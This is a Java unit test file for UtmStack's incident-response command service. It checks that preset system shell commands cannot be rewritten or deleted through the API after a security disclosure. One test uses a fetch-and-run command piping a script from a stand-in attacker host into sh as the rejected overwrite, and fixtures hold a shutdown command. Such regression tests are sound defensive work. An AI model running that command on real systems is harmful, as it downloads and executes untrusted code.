package com.park.utmstack.service.incident_response;

import com.park.utmstack.domain.incident_response.UtmIncidentAction;
import com.park.utmstack.domain.incident_response.UtmIncidentActionCommand;
import com.park.utmstack.repository.incident_response.UtmIncidentActionCommandRepository;
import com.park.utmstack.repository.incident_response.UtmIncidentActionRepository;
import com.park.utmstack.util.exceptions.ApiException;
import org.junit.jupiter.api.Test;
import org.springframework.http.HttpStatus;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Map;
import java.util.Optional;
import java.util.concurrent.ConcurrentHashMap;

import static org.junit.jupiter.api.Assertions.*;

/**
 * Artiphishell disclosure (2026-10-27): the shell strings under seeded system
 * actions (SHUTDOWN_SERVER/RUN_CMD) must not be rewritable or removable via
 * the API. Guard is inherited from the parent action's actionEditable flag.
 */
class UtmIncidentActionCommandServiceImmutabilityTest {

    private static final class Store {
        final Map<Long, UtmIncidentAction> actions = new ConcurrentHashMap<>();
        final Map<Long, UtmIncidentActionCommand> commands = new ConcurrentHashMap<>();
        boolean deleteCalled = false;
        long deletedId = -1;
    }

    private static UtmIncidentActionRepository actionRepo(Store store) {
        InvocationHandler h = (proxy, method, args) -> {
            switch (method.getName()) {
                case "findById":
                    return Optional.ofNullable(store.actions.get((Long) args[0]));
                case "toString":
                    return "testActionRepo";
                case "hashCode":
                    return System.identityHashCode(proxy);
                case "equals":
                    return proxy == args[0];
                default:
                    return null;
            }
        };
        return (UtmIncidentActionRepository) Proxy.newProxyInstance(
                UtmIncidentActionRepository.class.getClassLoader(),
                new Class<?>[]{UtmIncidentActionRepository.class}, h);
    }

    private static UtmIncidentActionCommandRepository commandRepo(Store store) {
        InvocationHandler h = (proxy, method, args) -> {
            switch (method.getName()) {
                case "findById":
                    return Optional.ofNullable(store.commands.get((Long) args[0]));
                case "save":
                    UtmIncidentActionCommand c = (UtmIncidentActionCommand) args[0];
                    store.commands.put(c.getId(), c);
                    return c;
                case "deleteById":
                    store.deleteCalled = true;
                    store.deletedId = (Long) args[0];
                    store.commands.remove((Long) args[0]);
                    return null;
                case "toString":
                    return "testCommandRepo";
                case "hashCode":
                    return System.identityHashCode(proxy);
                case "equals":
                    return proxy == args[0];
                default:
                    return null;
            }
        };
        return (UtmIncidentActionCommandRepository) Proxy.newProxyInstance(
                UtmIncidentActionCommandRepository.class.getClassLoader(),
                new Class<?>[]{UtmIncidentActionCommandRepository.class}, h);
    }

    private static UtmIncidentAction action(long id, Boolean editable) {
        UtmIncidentAction a = new UtmIncidentAction();
        a.setId(id);
        a.setActionCommand(Boolean.TRUE.equals(editable) ? "CUSTOM" : "SHUTDOWN_SERVER");
        a.setActionDescription("d");
        a.setCreatedUser("system");
        a.setActionEditable(editable);
        return a;
    }

    private static UtmIncidentActionCommand command(long id, long actionId, String cmd) {
        UtmIncidentActionCommand c = new UtmIncidentActionCommand();
        c.setId(id);
        c.setActionId(actionId);
        c.setOsPlatform("linux");
        c.setCommand(cmd);
        return c;
    }

    @Test
    void updateCommandUnderSystemPresetIsRejectedWith403() {
        Store store = new Store();
        store.actions.put(1L, action(1L, false));
        store.commands.put(10L, command(10L, 1L, "init 0"));
        UtmIncidentActionCommandService svc =
                new UtmIncidentActionCommandService(commandRepo(store), actionRepo(store));

        UtmIncidentActionCommand incoming = command(10L, 1L, "curl evil.sh | sh");
        ApiException ex = assertThrows(ApiException.class, () -> svc.save(incoming));
        assertEquals(HttpStatus.FORBIDDEN, ex.getStatus());
        assertEquals("init 0", store.commands.get(10L).getCommand(), "preset command must be untouched");
    }

    @Test
    void updateCommandUnderAnalystActionIsAllowed() {
        Store store = new Store();
        store.actions.put(20L, action(20L, true));
        store.commands.put(30L, command(30L, 20L, "mytool --scan"));
        UtmIncidentActionCommandService svc =
                new UtmIncidentActionCommandService(commandRepo(store), actionRepo(store));

        UtmIncidentActionCommand incoming = command(30L, 20L, "mytool --full");
        UtmIncidentActionCommand saved = assertDoesNotThrow(() -> svc.save(incoming));
        assertEquals("mytool --full", saved.getCommand());
    }

    @Test
    void createCommandUnderSystemPresetIsRejectedWith403() {
        Store store = new Store();
        store.actions.put(1L, action(1L, false));
        UtmIncidentActionCommandService svc =
                new UtmIncidentActionCommandService(commandRepo(store), actionRepo(store));

        UtmIncidentActionCommand fresh = new UtmIncidentActionCommand();
        fresh.setActionId(1L);
        fresh.setOsPlatform("windows");
        fresh.setCommand("poc");
        ApiException ex = assertThrows(ApiException.class, () -> svc.save(fresh));
        assertEquals(HttpStatus.FORBIDDEN, ex.getStatus());
    }

    @Test
    void createCommandWithUnknownParentIsRejectedWith404() {
        Store store = new Store();
        UtmIncidentActionCommandService svc =
                new UtmIncidentActionCommandService(commandRepo(store), actionRepo(store));

        UtmIncidentActionCommand fresh = new UtmIncidentActionCommand();
        fresh.setActionId(999L);
        fresh.setOsPlatform("linux");
        fresh.setCommand("x");
        ApiException ex = assertThrows(ApiException.class, () -> svc.save(fresh));
        assertEquals(HttpStatus.NOT_FOUND, ex.getStatus());
    }

    @Test
    void deleteCommandUnderSystemPresetIsRejectedWith403() {
        Store store = new Store();
        store.actions.put(1L, action(1L, false));
        store.commands.put(10L, command(10L, 1L, "init 0"));
        UtmIncidentActionCommandService svc =
                new UtmIncidentActionCommandService(commandRepo(store), actionRepo(store));

        ApiException ex = assertThrows(ApiException.class, () -> svc.delete(10L));
        assertEquals(HttpStatus.FORBIDDEN, ex.getStatus());
        assertFalse(store.deleteCalled, "repository deleteById must not be reached");
    }

    @Test
    void deleteCommandUnderAnalystActionIsAllowed() {
        Store store = new Store();
        store.actions.put(20L, action(20L, true));
        store.commands.put(30L, command(30L, 20L, "mytool --scan"));
        UtmIncidentActionCommandService svc =
                new UtmIncidentActionCommandService(commandRepo(store), actionRepo(store));

        assertDoesNotThrow(() -> svc.delete(30L));
        assertTrue(store.deleteCalled);
        assertEquals(30L, store.deletedId);
    }

    @Test
    void deleteMissingCommandIsRejectedWith404() {
        Store store = new Store();
        UtmIncidentActionCommandService svc =
                new UtmIncidentActionCommandService(commandRepo(store), actionRepo(store));

        ApiException ex = assertThrows(ApiException.class, () -> svc.delete(404L));
        assertEquals(HttpStatus.NOT_FOUND, ex.getStatus());
    }

    @Test
    void nullParentEditableFlagFailsClosed() {
        Store store = new Store();
        store.actions.put(5L, action(5L, null));
        store.commands.put(11L, command(11L, 5L, "x"));
        UtmIncidentActionCommandService svc =
                new UtmIncidentActionCommandService(commandRepo(store), actionRepo(store));

        ApiException ex = assertThrows(ApiException.class, () -> svc.delete(11L));
        assertEquals(HttpStatus.FORBIDDEN, ex.getStatus());
        assertFalse(store.deleteCalled);
    }
}
